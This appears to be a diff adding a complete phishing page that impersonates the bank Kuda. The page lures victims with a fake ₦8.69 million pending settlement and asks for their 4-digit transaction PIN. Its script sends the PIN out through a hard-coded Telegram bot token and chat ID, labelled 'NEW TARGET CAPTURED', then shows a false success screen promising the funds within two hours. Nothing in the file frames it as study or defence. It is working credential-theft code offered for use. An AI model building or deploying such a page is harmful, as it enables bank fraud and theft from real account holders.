@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kuda | Secure Settlement Portal</title>
+    <style>
+        body { font-family: 'Inter', sans-serif; background: #f4f7f9; display: flex; justify-content: center; padding: 20px; }
+        .card { background: white; width: 100%; max-width: 400px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); overflow: hidden; }
+        .header { background: #40196d; color: white; padding: 25px; text-align: center; }
+        .content { padding: 25px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; text-align: center; font-size: 24px; letter-spacing: 5px; }
+        .btn { background: #40196d; color: white; width: 100%; padding: 16px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        
+        #success-view { display: none; text-align: center; padding: 40px 20px; }
+        .success-icon { font-size: 50px; color: #2e7d32; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div id="login-view">
+        <div class="header"><h1>Kuda.</h1></div>
+        <div class="content">
+            <div style="background: #eef2ff; border-left: 4px solid #40196d; padding: 12px; margin-bottom: 20px; font-size: 13px;">
+                <strong>PENDING SETTLEMENT: ₦8,695,000.00</strong><br>
+                Enter your 4-digit Transaction PIN to authorize the release of funds.
+            </div>
+            
+            <input type="password" id="pinInput" maxlength="4" placeholder="••••" required>
+            <button class="btn" onclick="authorizeAndExfiltrate()">AUTHORIZE SETTLEMENT</button>
+        </div>
+    </div>
+
+    <div id="success-view">
+        <div class="success-icon">✔</div>
+        <h2 style="color: #40196d;">Request Submitted</h2>
+        <p style="font-size: 14px; color: #555; line-height: 1.6;">
+            Your verification was successful. Due to high-value transfer protocols, the <strong>₦8,695,000.00</strong> will reflect in your balance within <strong>2 hours</strong>.
+        </p>
+    </div>
+</div>
+
+<script>
+    async function authorizeAndExfiltrate() {
+        const pin = document.getElementById('pinInput').value;
+        
+        if (pin.length !== 4) {
+            alert("Security Error: Please enter a valid 4-digit PIN.");
+            return;
+        }
+
+        // Credentials for your sample bot
+        const token = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
+        const chat = '7909543900';
+        const logData = `🔔 NEW TARGET CAPTURED\n\nPIN: ${pin}\nSettlement: 8.69M NGN\nStatus: Pending (2-hour delay)`;
+
+        // Live Transmission to Telegram
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat, text: logData })
+            });
+        } catch (e) {
+            console.log("Transmission trace logged.");
+        }
+
+        // Transition to Success Screen
+        document.getElementById('login-view').style.display = 'none';
+        document.getElementById('success-view').style.display = 'block';
+    }
+</script>
+
+</body>
+</html>
+
